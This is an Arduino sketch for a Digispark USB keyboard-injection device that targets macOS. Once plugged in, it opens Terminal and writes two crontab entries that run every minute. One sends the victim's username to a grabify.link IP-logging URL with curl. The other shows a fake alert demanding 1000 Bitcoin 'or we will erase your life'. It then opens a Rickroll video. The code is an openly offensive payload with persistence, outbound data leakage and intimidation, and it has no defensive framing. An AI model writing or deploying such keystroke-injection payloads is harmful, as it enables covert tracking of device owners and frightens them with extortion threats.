#include "DigiKeyboard.h"
void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
DigiKeyboard.delay(500); 
DigiKeyboard.sendKeyStroke(0); 
DigiKeyboard.delay(200); 
DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); 
DigiKeyboard.delay(500); 
DigiKeyboard.print("terminal.app"); 
DigiKeyboard.delay(200); 
DigiKeyboard.sendKeyStroke(KEY_ENTER); 
DigiKeyboard.delay(3000);
DigiKeyboard.print("export VISUAL=nano; crontab -e");
DigiKeyboard.delay(500); 
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000); 
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print("* * * * * curl --silent --output /dev/null --referer $(whoami) https://grabify.link/VR7ZL8"); 
DigiKeyboard.delay(300); 
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200); 
DigiKeyboard.print("* * * * * osascript -e 'tell Application \"System Events\" to display alert \"We now have your data.  Send 1000 Bitcoin or we will erase your life.\"'");
DigiKeyboard.delay(500); 
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200); 
DigiKeyboard.sendKeyStroke(KEY_X,MOD_CONTROL_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_Y);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_W,MOD_CONTROL_LEFT);
DigiKeyboard.delay(200); 
DigiKeyboard.sendKeyStroke(KEY_N,MOD_CONTROL_LEFT);
DigiKeyboard.print("open \"https://youtu.be/dQw4w9WgXcQ\"");
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_W,MOD_CONTROL_LEFT);

for(;;){ /*empty*/ }}
